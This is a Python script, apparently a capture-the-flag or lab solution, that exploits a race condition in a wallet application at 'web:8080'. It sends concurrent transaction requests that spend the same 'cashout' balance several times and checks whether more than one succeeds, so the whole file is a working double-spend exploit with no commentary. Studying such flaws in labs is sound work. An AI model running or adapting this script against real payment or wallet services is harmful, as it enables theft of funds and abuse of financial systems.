import requests, threading, time
base='http://web:8080'

def attempt(nreq=2,amt=1000):
    s=requests.Session(); s.get(base+'/')
    cookie=s.cookies.get_dict()
    headers={'Content-Type':'application/json'}
    payloads=[{'sourceCoin':'cashout','targetCoin':'ascoin','balance':amt},
              {'sourceCoin':'cashout','targetCoin':'doge','balance':amt},
              {'sourceCoin':'cashout','targetCoin':'ycmi','balance':amt},
              {'sourceCoin':'cashout','targetCoin':'smtl','balance':amt}][:nreq]
    results=[None]*nreq
    def worker(i,p):
        r=requests.post(base+'/api/wallet/transaction',json=p,cookies=cookie,timeout=10)
        results[i]=(r.status_code,r.text)
    th=[]
    for i,p in enumerate(payloads):
        t=threading.Thread(target=worker,args=(i,p)); th.append(t)
    for t in th:t.start()
    for t in th:t.join()
    b=requests.get(base+'/api/wallet/balances',cookies=cookie).json()
    bal={x['name']:x['value'] for x in b}
    return results,bal,cookie

for n in [2,3,4]:
    ok=0
    for i in range(20):
        res,bal,c=attempt(nreq=n,amt=1000)
        succ=sum('"result":1' in x[1] for x in res)
        total_non=sum(v for k,v in bal.items() if k!='cashout')
        if succ>1:
            ok+=1
            print('n',n,'try',i,'succ',succ,'bal',bal)
            break
    print('n',n,'race_found',ok)
